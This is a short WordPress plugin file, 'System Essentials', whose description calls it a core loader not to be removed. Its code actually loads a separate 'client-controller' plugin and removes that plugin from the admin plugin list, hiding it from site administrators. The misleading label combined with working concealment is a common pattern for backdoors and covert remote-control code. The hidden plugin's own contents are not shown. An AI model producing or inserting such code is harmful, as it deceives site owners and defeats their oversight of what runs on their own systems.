<?php
/*
* Plugin Name: System Essentials
* Description: Core functionality loader. Do not remove.
* Version: 1.1
* Author: WebExpert Rabbi
* Author URI: https://webexpertrabbi.com/
*/

// Define the full path to the client controller plugin file
$client_plugin_path = WP_PLUGIN_DIR . '/client-controller/client-controller.php';

// Check if the plugin file actually exists before trying to load it
if (file_exists($client_plugin_path)) {

    // Load the main client plugin
    require_once $client_plugin_path;

    // Hide the client plugin from the admin plugin list
    add_filter('all_plugins', function ($plugins) {
        $plugin_key = 'client-controller/client-controller.php';
        if (isset($plugins[$plugin_key])) {
            unset($plugins[$plugin_key]);
        }
        return $plugins;
    });
}
